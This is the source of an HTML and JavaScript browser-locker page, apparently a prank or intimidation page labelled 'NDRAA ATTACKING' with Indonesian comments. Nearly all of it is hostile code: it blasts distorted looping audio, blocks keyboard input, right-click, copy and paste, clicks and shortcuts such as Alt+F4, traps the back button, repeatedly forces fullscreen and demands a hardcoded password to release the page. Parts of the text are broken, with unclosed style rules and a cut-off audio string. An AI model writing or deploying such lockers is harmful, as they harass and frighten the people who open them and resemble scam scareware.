<!DOCTYPE html>

    <style>
        * {

        body {
            background: #4a0000;

            text-align: center;
            height: 100vh;

            overflow: hidden;

        .lockdown-container {
            background: rgba(0,0,0,0.9);
            padding: 40px;

            border: 3px solid #ff8800;
            box-shadow: 0 0 80px rgba(255,68,0,0.8);
            max-width: 700px;
            width: 90%;
            animation: pulse 1.5s infinite, shake 5s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 30px rgba(255,68,0,0.4); }
            50% { box-shadow: 0 0 100px rgba(255,0,0,1); }
            100% { box-shadow: 0 0 30px rgba(255,68,0,0.4); }
        }
        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }

        h1 {

        @keyframes glitch {

    <!-- AUDIO ENGINE - LEBIH BRUTAL DENGAN BASS + ALARM -->
    <script>
        (function() {
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (!AudioContext) {
                    // Fallback audio element
                    let fallbackAudio = new Audio('data:audio/wav;base64,//uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAGDgYtAgAyN+QWaAAihwMWm4G8QQRDiMcCB//H0H//4f/+MDH/8f//8f//Pj//wFAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIA==');
                    fallbackAudio.loop = true;
                    fallbackAudio.volume = 1.0;
                    fallbackAudio.play().catch(e => {});
                } else {
                    let audioCtx = new AudioContext();
                    
                    // Master gain
                    let masterGain = audioCtx.createGain();
                    masterGain.gain.value = 0.4;
                    
                    // Distortion
                    let distortion = audioCtx.createWaveShaper();
                    function makeDistortionCurve(amount) {
                        let k = typeof amount === 'number' ? amount : 50,
                            n_samples = 44100,
                            curve = new Float32Array(n_samples),
                            deg = Math.PI / 180,
                            i = 0,
                            x;
                        for (; i < n_samples; ++i) {
                            x = i * 2 / n_samples - 1;
                            curve[i] = (3 + k) * x * 20 * deg / (Math.PI + k * Math.abs(x));
                        }
                        return curve;
                    }
                    distortion.curve = makeDistortionCurve(600);
                    distortion.oversample = '4x';
                    
                    // Biquad filter untuk bass boost
                    let bassFilter = audioCtx.createBiquadFilter();
                    bassFilter.type = 'lowshelf';
                    bassFilter.frequency.value = 200;
                    bassFilter.gain.value = 15; // Boost bass biar menggelegar
                    
                    // Koneksi: osc -> distortion -> bassFilter -> masterGain
                    
                    function startNoise() {
                        // Osc 1: Sawtooth (nada rendah)
                        let osc1 = audioCtx.createOscillator();
                        osc1.type = 'sawtooth';
                        osc1.frequency.value = 100;
                        
                        // Osc 2: Square (nada sedang)
                        let osc2 = audioCtx.createOscillator();
                        osc2.type = 'square';
                        osc2.frequency.value = 200;
                        
                        // Osc 3: Triangle (nada tinggi)
                        let osc3 = audioCtx.createOscillator();
                        osc3.type = 'triangle';
                        osc3.frequency.value = 400;
                        
                        // Osc 4: Sine (bass dalam)
                        let osc4 = audioCtx.createOscillator();
                        osc4.type = 'sine';
                        osc4.frequency.value = 60;
                        
                        // Hubungkan semua ke distortion
                        osc1.connect(distortion);
                        osc2.connect(distortion);
                        osc3.connect(distortion);
                        osc4.connect(distortion);
                        
                        distortion.connect(bassFilter);
                        bassFilter.connect(masterGain);
                        masterGain.connect(audioCtx.destination);
                        
                        // Start semua
                        osc1.start();
                        osc2.start();
                        osc3.start();
                        osc4.start();
                        
                        // Modulasi frekuensi random setiap 150ms
                        setInterval(() => {
                            if (!audioCtx) return;
                            osc1.frequency.value = 80 + Math.random() * 300;
                            osc2.frequency.value = 150 + Math.random() * 400;
                            osc3.frequency.value = 300 + Math.random() * 600;
                            osc4.frequency.value = 40 + Math.random() * 100;
                        }, 150);
                        
                        window.__audioOscillators = [osc1, osc2, osc3, osc4];
                    }
                    
                    document.addEventListener('click', function initAudio() {
                        if (audioCtx.state === 'suspended') {
                            audioCtx.resume().then(() => {
                                startNoise();
                            });
                        } else {
                            startNoise();
                        }
                        document.removeEventListener('click', initAudio);
                    }, { once: true });
                    
                    if (audioCtx.state === 'suspended') {
                        audioCtx.resume().then(() => {
                            startNoise();
                        }).catch(() => {});
                    } else {
                        startNoise();
                    }
                }
            } catch (e) {}
        })();

        // =============== LOCKDOWN ENGINE (SAMA TAPI DENGAN NAMA BARU) ===============
        (function() {
            const CORRECT_PASSWORD = 'RENDRA|NAYLA';
            let unlocked = false;

            // Disable semua keyboard
            document.addEventListener('keydown', function(e) {
                if (unlocked) return;
                if (e.target.id === 'unlockInput') {
                    const allowedKeys = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Tab', 'Enter'];
                    if (allowedKeys.includes(e.key)) {
                        if (e.key === 'Tab') e.preventDefault();
                        if (e.key === 'Enter') {
                            e.preventDefault();
                            checkPassword();
                        }
                        return;
                    }
                    if (e.key.length === 1) {
                        return; // Allow typing
                    }
                }
                e.preventDefault();
                e.stopPropagation();
                return false;
            }, true);

            // Disable context menu, copy, cut, paste
            document.addEventListener('contextmenu', e => { if(!unlocked) e.preventDefault(); }, true);
            document.addEventListener('copy', e => { if(!unlocked) e.preventDefault(); }, true);
            document.addEventListener('cut', e => { if(!unlocked) e.preventDefault(); }, true);
            document.addEventListener('paste', e => { if(!unlocked) e.preventDefault(); }, true);

            // Disable klik di luar input
            document.addEventListener('click', function(e) {
                if (unlocked) return;
                if (e.target.id !== 'unlockInput') {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            }, true);

            // Blokir shortcut
            window.addEventListener('keydown', function(e) {
                if (unlocked) return;
                if (e.key === 'F11' || (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.key === 'w') || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u')) {
                    e.preventDefault();
                    return false;
                }
                if (e.altKey && e.key === 'F4') {
                    e.preventDefault();
                    alert('ALT+F4 DIBLOKIR OLEH NDRAA!');
                    return false;
                }
            }, true);

            // Mencegah pindah tab
            window.addEventListener('blur', function() {
                if (unlocked) return;
                setTimeout(() => {
                    window.focus();
                    document.title = '⚠️ NDRAA ATTACKING - JANGAN KELUAR! ⚠️';
                }, 100);
            });

            // Mencegah history back
            history.pushState(null, null, location.href);
            window.addEventListener('popstate', function(event) {
                if (unlocked) return;
                history.pushState(null, null, location.href);
            });

            // Fullscreen paksa
            function requestFullScreen() {
                if (unlocked) return;
                let elem = document.documentElement;
                if (elem.requestFullscreen) elem.requestFullscreen().catch(()=>{});
                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
                else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
            }
            setInterval(() => {
                if (!document.fullscreenElement && !document.webkitFullscreenElement && !unlocked) {
                    requestFullScreen();
                }
            }, 2000);

            // Input handler
            const inputField = document.getElementById('unlockInput');
            const statusMsg = document.getElementById('statusMsg');
            
            inputField.addEventListener('keyup', function(e) {
                if (e.key === 'Enter') checkPassword();
            });

            window.checkPassword = function() {
                let entered = inputField.value;
                if (entered === CORRECT_PASSWORD) {
                    unlocked = true;
                    statusMsg.innerHTML = '✅ BERHASIL! NDRAA ATTACKING DINONAKTIFKAN.';
                    statusMsg.style.color = '#88ff88';
                    
                    if (window.__audioOscillators) {
                        window.__audioOscillators.forEach(osc => { try { osc.stop(); } catch(e) {} });
                    }
                    
                    setTimeout(() => {
                        window.location.href = window.location.href + '#unlocked';
                        window.location.reload();
                    }, 1000);
                } else {
                    statusMsg.innerHTML = '❌ SANDI SALAH! COBA LAGI.';
                    statusMsg.style.color = '#ff8888';
                    inputField.value = '';
                    inputField.focus();
                    
                    try {
                        let beep = new Audio('data:audio/wav;base64,//uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAGDgYtAgAyN+QWaAAihwMWm4G8QQRDiMcCB//H0H//4f/+MDH/8f//8f//Pj//wFAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC                         beep.play();
                    } catch(e) {}
                }
            };

            inputField.focus();

            let btn = document.createElement('button');
            btn.id = 'unlockBtn';
            btn.style.display = 'none';
            btn.onclick = checkPassword;
            document.body.appendChild(btn);
        })();
